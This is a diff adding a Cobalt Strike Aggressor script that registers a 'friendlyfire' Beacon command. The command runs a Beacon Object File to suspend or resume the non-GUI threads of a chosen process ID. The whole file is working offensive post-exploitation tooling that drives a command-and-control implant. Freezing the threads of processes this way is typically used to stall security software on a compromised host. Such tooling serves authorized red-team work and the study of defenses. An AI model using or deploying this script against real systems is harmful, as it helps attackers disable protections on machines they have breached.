@@ -1,0 +1,60 @@
+# author: @kreepsec
+# friendlyfire.cna - Aggressor Script for FriendlyFire BOF
+#
+# This script registers a "friendlyfire" command for Beacon. It takes:
+#     <PID> [resume]
+# and calls the FriendlyFire BOF to suspend (or resume) non-GUI threads.
+#
+# Make sure you have these object files in the same folder:
+#   - friendlyfire.x64.o   (for 64-bit Beacon sessions)
+#   - friendlyfire.x86.o   (for 32-bit Beacon sessions)
+#
+
+beacon_command_register(
+    "friendlyfire",
+    "Run the FriendlyFire BOF to suspend or resume non-GUI threads",
+    "
+Command: friendlyfire
+Summary: Suspends non-GUI threads for a target process or resumes them.
+Usage:   friendlyfire <PID> [resume]
+Example: friendlyfire 1234
+         friendlyfire 1234 resume
+"
+);
+
+alias friendlyfire {
+
+    local('$bid $barch $pid $resume $args $handle $data');
+
+    $bid   = $1;
+    $barch = barch($bid);
+    $pid   = $2;
+
+    btask($bid, "Running FriendlyFire - author: @kreepsec");
+
+    if ((size(@_) < 2) || (size(@_) > 3)) {
+        berror($bid, "Usage: friendlyfire <PID> [resume]");
+        return;
+    }
+
+    if (size(@_) == 3) {
+        if ($3 eq "resume") {
+            $resume = $3;
+        }
+        else {
+            berror($bid, "What are you even doing? Just type 'resume'");
+            berror($bid, beacon_command_detail("friendlyfire"));
+            return;
+        }
+    } else {
+        $resume = "";
+    }
+
+    $args = bof_pack($bid, "iz", $pid, $resume);
+
+    $handle = openf(script_resource("friendlyfire." . $barch . ".o"));
+    $data   = readb($handle, -1);
+    closef($handle);
+
+    beacon_inline_execute($bid, $data, "go", $args);
+}
